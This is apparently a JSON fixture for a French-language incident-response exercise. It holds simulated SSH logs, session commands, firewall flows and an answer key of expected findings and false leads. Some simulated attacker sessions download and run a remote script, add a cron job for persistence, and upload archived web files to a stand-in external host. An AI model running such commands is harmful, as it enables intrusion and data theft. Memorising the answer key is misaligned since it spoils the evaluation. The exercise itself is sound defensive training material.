@@ -1,0 +1,187 @@
+{
+  "alerte": "Transfert sortant inhabituel : 640 Mo envoyés à 04:12 par web-prod (10.0.0.20) vers 198.51.100.99, une adresse externe jamais vue auparavant.",
+  "auth": [
+    {"time": "00:00:03", "ip": "10.0.0.40", "user": "nagios", "result": "Accepted", "session": "s-5000"},
+    {"time": "01:00:03", "ip": "10.0.0.40", "user": "nagios", "result": "Accepted", "session": "s-5001"},
+    {"time": "01:12:09", "ip": "192.0.2.44", "user": "root", "result": "Failed", "session": null},
+    {"time": "01:12:11", "ip": "192.0.2.44", "user": "admin", "result": "Failed", "session": null},
+    {"time": "01:12:14", "ip": "192.0.2.44", "user": "root", "result": "Failed", "session": null},
+    {"time": "02:00:03", "ip": "10.0.0.40", "user": "nagios", "result": "Accepted", "session": "s-5002"},
+    {"time": "02:31:10", "ip": "203.0.113.77", "user": "root", "result": "Failed", "session": null},
+    {"time": "02:34:05", "ip": "203.0.113.77", "user": "admin", "result": "Failed", "session": null},
+    {"time": "02:37:41", "ip": "203.0.113.77", "user": "ubuntu", "result": "Failed", "session": null},
+    {"time": "02:41:02", "ip": "203.0.113.77", "user": "deploy", "result": "Failed", "session": null},
+    {"time": "02:44:30", "ip": "203.0.113.77", "user": "test", "result": "Failed", "session": null},
+    {"time": "02:48:12", "ip": "203.0.113.77", "user": "postgres", "result": "Failed", "session": null},
+    {"time": "02:51:47", "ip": "203.0.113.77", "user": "deploy", "result": "Failed", "session": null},
+    {"time": "02:55:18", "ip": "203.0.113.77", "user": "deploy", "result": "Accepted", "session": "s-4101"},
+    {"time": "03:00:02", "ip": "10.0.0.30", "user": "backup", "result": "Accepted", "session": "s-3001"},
+    {"time": "03:00:03", "ip": "10.0.0.40", "user": "nagios", "result": "Accepted", "session": "s-5003"},
+    {"time": "04:00:03", "ip": "10.0.0.40", "user": "nagios", "result": "Accepted", "session": "s-5004"},
+    {"time": "04:10:05", "ip": "203.0.113.77", "user": "deploy", "result": "Accepted", "session": "s-4102"},
+    {"time": "05:00:03", "ip": "10.0.0.40", "user": "nagios", "result": "Accepted", "session": "s-5005"},
+    {"time": "05:40:30", "ip": "198.51.100.7", "user": "admin", "result": "Failed", "session": null},
+    {"time": "05:40:33", "ip": "198.51.100.7", "user": "admin", "result": "Failed", "session": null},
+    {"time": "06:00:03", "ip": "10.0.0.40", "user": "nagios", "result": "Accepted", "session": "s-5006"},
+    {"time": "07:00:03", "ip": "10.0.0.40", "user": "nagios", "result": "Accepted", "session": "s-5007"},
+    {"time": "08:00:03", "ip": "10.0.0.40", "user": "nagios", "result": "Accepted", "session": "s-5008"},
+    {"time": "08:30:40", "ip": "10.0.0.5", "user": "pierre", "result": "Failed", "session": null},
+    {"time": "08:31:02", "ip": "10.0.0.5", "user": "pierre", "result": "Accepted", "session": "s-6001"},
+    {"time": "09:00:03", "ip": "10.0.0.40", "user": "nagios", "result": "Accepted", "session": "s-5009"},
+    {"time": "09:12:40", "ip": "10.0.0.7", "user": "marie", "result": "Failed", "session": null},
+    {"time": "09:12:55", "ip": "10.0.0.7", "user": "marie", "result": "Accepted", "session": "s-6101"},
+    {"time": "10:00:03", "ip": "10.0.0.40", "user": "nagios", "result": "Accepted", "session": "s-5010"},
+    {"time": "10:12:44", "ip": "10.0.0.5", "user": "pierre", "result": "Accepted", "session": "s-6002"},
+    {"time": "11:00:03", "ip": "10.0.0.40", "user": "nagios", "result": "Accepted", "session": "s-5011"},
+    {"time": "11:02:01", "ip": "192.0.2.150", "user": "oracle", "result": "Failed", "session": null},
+    {"time": "11:02:03", "ip": "192.0.2.150", "user": "git", "result": "Failed", "session": null},
+    {"time": "11:02:04", "ip": "192.0.2.150", "user": "pi", "result": "Failed", "session": null},
+    {"time": "11:02:06", "ip": "192.0.2.150", "user": "ftpuser", "result": "Failed", "session": null},
+    {"time": "11:02:08", "ip": "192.0.2.150", "user": "test", "result": "Failed", "session": null},
+    {"time": "12:00:03", "ip": "10.0.0.40", "user": "nagios", "result": "Accepted", "session": "s-5012"},
+    {"time": "13:00:03", "ip": "10.0.0.40", "user": "nagios", "result": "Accepted", "session": "s-5013"},
+    {"time": "14:00:03", "ip": "10.0.0.40", "user": "nagios", "result": "Accepted", "session": "s-5014"},
+    {"time": "14:20:31", "ip": "10.0.0.7", "user": "marie", "result": "Accepted", "session": "s-6102"},
+    {"time": "15:00:03", "ip": "10.0.0.40", "user": "nagios", "result": "Accepted", "session": "s-5015"},
+    {"time": "16:00:03", "ip": "10.0.0.40", "user": "nagios", "result": "Accepted", "session": "s-5016"},
+    {"time": "16:45:10", "ip": "10.0.0.5", "user": "pierre", "result": "Accepted", "session": "s-6003"},
+    {"time": "17:00:03", "ip": "10.0.0.40", "user": "nagios", "result": "Accepted", "session": "s-5017"},
+    {"time": "18:00:03", "ip": "10.0.0.40", "user": "nagios", "result": "Accepted", "session": "s-5018"},
+    {"time": "18:05:12", "ip": "203.0.113.12", "user": "marie", "result": "Accepted", "session": "s-6103"},
+    {"time": "19:00:03", "ip": "10.0.0.40", "user": "nagios", "result": "Accepted", "session": "s-5019"},
+    {"time": "20:00:03", "ip": "10.0.0.40", "user": "nagios", "result": "Accepted", "session": "s-5020"},
+    {"time": "21:00:03", "ip": "10.0.0.40", "user": "nagios", "result": "Accepted", "session": "s-5021"},
+    {"time": "22:00:03", "ip": "10.0.0.40", "user": "nagios", "result": "Accepted", "session": "s-5022"},
+    {"time": "23:00:03", "ip": "10.0.0.40", "user": "nagios", "result": "Accepted", "session": "s-5023"}
+  ],
+  "commandes": {
+    "s-5000": ["uptime", "df -h", "exit"],
+    "s-5001": ["uptime", "df -h", "exit"],
+    "s-5002": ["uptime", "df -h", "exit"],
+    "s-5003": ["uptime", "df -h", "exit"],
+    "s-5004": ["uptime", "df -h", "exit"],
+    "s-5005": ["uptime", "df -h", "exit"],
+    "s-5006": ["uptime", "df -h", "exit"],
+    "s-5007": ["uptime", "df -h", "exit"],
+    "s-5008": ["uptime", "df -h", "exit"],
+    "s-5009": ["uptime", "df -h", "exit"],
+    "s-5010": ["uptime", "df -h", "exit"],
+    "s-5011": ["uptime", "df -h", "exit"],
+    "s-5012": ["uptime", "df -h", "exit"],
+    "s-5013": ["uptime", "df -h", "exit"],
+    "s-5014": ["uptime", "df -h", "exit"],
+    "s-5015": ["uptime", "df -h", "exit"],
+    "s-5016": ["uptime", "df -h", "exit"],
+    "s-5017": ["uptime", "df -h", "exit"],
+    "s-5018": ["uptime", "df -h", "exit"],
+    "s-5019": ["uptime", "df -h", "exit"],
+    "s-5020": ["uptime", "df -h", "exit"],
+    "s-5021": ["uptime", "df -h", "exit"],
+    "s-5022": ["uptime", "df -h", "exit"],
+    "s-5023": ["uptime", "df -h", "exit"],
+    "s-3001": ["tar czf - /var/www /etc/nginx", "exit"],
+    "s-6001": ["systemctl status nginx", "tail -n 50 /var/log/nginx/error.log", "sudo apt update", "sudo apt upgrade -y", "exit"],
+    "s-6002": ["sudo useradd -m stagiaire", "sudo passwd stagiaire", "exit"],
+    "s-6003": ["df -h", "exit"],
+    "s-6101": ["cd /var/www/html", "git pull", "sudo systemctl reload nginx", "exit"],
+    "s-6102": ["tail -n 100 /var/log/nginx/access.log", "exit"],
+    "s-6103": ["ls", "exit"],
+    "s-4101": ["id", "uname -a", "cat /etc/passwd", "crontab -l", "curl -s http://198.51.100.99/p.sh -o /tmp/.p.sh", "bash /tmp/.p.sh", "(crontab -l; echo '*/30 * * * * bash /tmp/.p.sh') | crontab -", "exit"],
+    "s-4102": ["tar czf /tmp/d.tgz /var/www/uploads /etc/nginx", "curl -T /tmp/d.tgz http://198.51.100.99:8443/up", "rm /tmp/d.tgz", "exit"]
+  },
+  "pare_feu": [
+    {"time": "02:55:18", "src": "203.0.113.77", "dst": "10.0.0.20", "port": 22, "mb": 0},
+    {"time": "02:57:02", "src": "10.0.0.20", "dst": "198.51.100.99", "port": 80, "mb": 1},
+    {"time": "03:00:01", "src": "10.0.0.20", "dst": "198.51.100.99", "port": 8443, "mb": 0.1},
+    {"time": "03:00:05", "src": "10.0.0.30", "dst": "10.0.0.20", "port": 22, "mb": 0},
+    {"time": "03:05:20", "src": "10.0.0.20", "dst": "10.0.0.30", "port": 22, "mb": 1200},
+    {"time": "03:30:01", "src": "10.0.0.20", "dst": "198.51.100.99", "port": 8443, "mb": 0.1},
+    {"time": "04:00:01", "src": "10.0.0.20", "dst": "198.51.100.99", "port": 8443, "mb": 0.1},
+    {"time": "04:10:05", "src": "203.0.113.77", "dst": "10.0.0.20", "port": 22, "mb": 0},
+    {"time": "04:12:40", "src": "10.0.0.20", "dst": "198.51.100.99", "port": 8443, "mb": 640},
+    {"time": "04:30:01", "src": "10.0.0.20", "dst": "198.51.100.99", "port": 8443, "mb": 0.1},
+    {"time": "05:00:01", "src": "10.0.0.20", "dst": "198.51.100.99", "port": 8443, "mb": 0.1},
+    {"time": "05:30:01", "src": "10.0.0.20", "dst": "198.51.100.99", "port": 8443, "mb": 0.1},
+    {"time": "08:40:11", "src": "10.0.0.20", "dst": "192.0.2.80", "port": 443, "mb": 150},
+    {"time": "09:00:00", "src": "10.0.0.20", "dst": "192.0.2.10", "port": 443, "mb": 5},
+    {"time": "13:00:00", "src": "10.0.0.20", "dst": "192.0.2.10", "port": 443, "mb": 4},
+    {"time": "18:05:10", "src": "203.0.113.12", "dst": "10.0.0.20", "port": 22, "mb": 0}
+  ],
+  "comptes": [
+    {"account": "stagiaire", "created_at": "10:13:20", "by_session": "s-6002"}
+  ],
+  "verite": {
+    "faits_attendus": [
+      {
+        "fait": "IP de l'attaquant 203.0.113.77",
+        "mots_cles": [
+          "203.0.113.77"
+        ]
+      },
+      {
+        "fait": "compte deploy compromis (brute force lent)",
+        "mots_cles": [
+          "deploy"
+        ]
+      },
+      {
+        "fait": "serveur de l'attaquant 198.51.100.99",
+        "mots_cles": [
+          "198.51.100.99"
+        ]
+      },
+      {
+        "fait": "persistance par tâche cron",
+        "mots_cles": [
+          "cron"
+        ]
+      },
+      {
+        "fait": "exfiltration d'environ 640 Mo",
+        "mots_cles": [
+          "640"
+        ]
+      }
+    ],
+    "a_ne_pas_accuser": [
+      {
+        "element": "10.0.0.30",
+        "mots_cles": [
+          "10.0.0.30"
+        ],
+        "raison": "sauvegarde nocturne légitime (1200 Mo)"
+      },
+      {
+        "element": "compte stagiaire",
+        "mots_cles": [
+          "stagiaire"
+        ],
+        "raison": "créé légitimement par pierre"
+      },
+      {
+        "element": "10.0.0.40 / nagios",
+        "mots_cles": [
+          "10.0.0.40",
+          "nagios"
+        ],
+        "raison": "supervision horaire"
+      },
+      {
+        "element": "203.0.113.12",
+        "mots_cles": [
+          "203.0.113.12"
+        ],
+        "raison": "connexion légitime de marie depuis chez elle"
+      },
+      {
+        "element": "robots Internet",
+        "mots_cles": [
+          "192.0.2.44",
+          "198.51.100.7",
+          "192.0.2.150"
+        ],
+        "raison": "tentatives échouées, sans succès"
+      }
+    ]
+  }
+}
